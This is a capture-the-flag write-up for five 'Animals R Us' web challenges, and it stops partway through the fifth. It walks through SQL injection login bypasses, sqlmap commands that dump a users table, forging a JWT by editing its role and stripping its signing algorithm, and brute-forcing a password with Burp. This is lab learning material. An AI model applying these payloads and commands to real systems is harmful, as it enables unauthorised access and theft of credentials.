## Animals R Us 1 - In Plain SQLight

for this chal you simply have to login as the user james. 

first, i looked around the website and checked out /login.js.
then looking at the chal title i realized it was probably sql injection so i put a random payload 
' OR 1=1 in the password, and it returned 
```
{
    "message": "Server error",
    "error": {
        "message": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1",
        "code": "ER_PARSE_ERROR",
        "errno": 1064,
        "sql": "SELECT * FROM users WHERE username = 'james' AND BINARY password = '' OR 1=1'",
        "sqlState": "42000",
        "sqlMessage": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1"
    }
}
```
now having the sql text, i put james' -- into the username to comment out the password part and voila. got the flag.

## Animals R Us 2 - Out of SQLight, Out of Mind

This one was also pretty easy, i used sqlmap to dump the tables in the users table.

req.txt:
```
POST /login HTTP/2

{"username":"INJECT_HERE","password":"a"}
```

then 
```
sqlmap -r req.txt --batch -p username --dbs
sqlmap -r req.txt --batch -p username -D web_db --tables
sqlmap -r req.txt --batch -p username -D web_db -T users --columns
sqlmap -r req.txt --batch -p username -D web_db -T users --dump
```
and you get the password.

## Animals R Us 3 - Signing Off
in here you have to gain access to /admin.

This one was also really easy. whenever I went to /admin it kicked me out, so I thought there had to be some
admin privileges my james user was missing. So i looked at my cookies and decoded my jwt token:
``` eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywidXNlcm5hbWUiOiJqYW1lcyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQ2OTkxOTA2LCJleHAiOjE3NDY5OTU1MDZ9.Bm4oQkxO7qpL9jUkGU8hzTXHkwAPyM_Vws48tnvQ7AQ ```

into this:
```
{
  "id": 3,
  "username": "james",
  "role": "user",
  "iat": 1746991906,
  "exp": 1746995506
}
```
I changed role to admin, set my cookie, and was able to access /admin. 

## Animals R Us 4 - Signature? None Thanks

using the jwt token from last time, i changed my username to william and tried to go to /settings but it didnt work.
I tried using burp suite to see what the server was responding with but it only redirected me to the login page. 
Looking at the chal title, i felt it had something to do with the jwt signature and somehow negating it. 

jwt header:
```
{
  "alg": "HS256",
  "typ": "JWT"
}
```
somehow getting rid of HS256 from the alg text allowed me to access settings. Did i get lucky? hell yea. I have no idea how that worked.

## Animals R Us 5 - letmein

Now we have to bruteforce jane's login password with the provided wordlist. Putting this into burpsuite with the wordlist and then setting the password to be changed was easy enough. 
looking at all the requests, find the password that doesn't return an status code of 400, and thats your password. 

should be sum like this
```
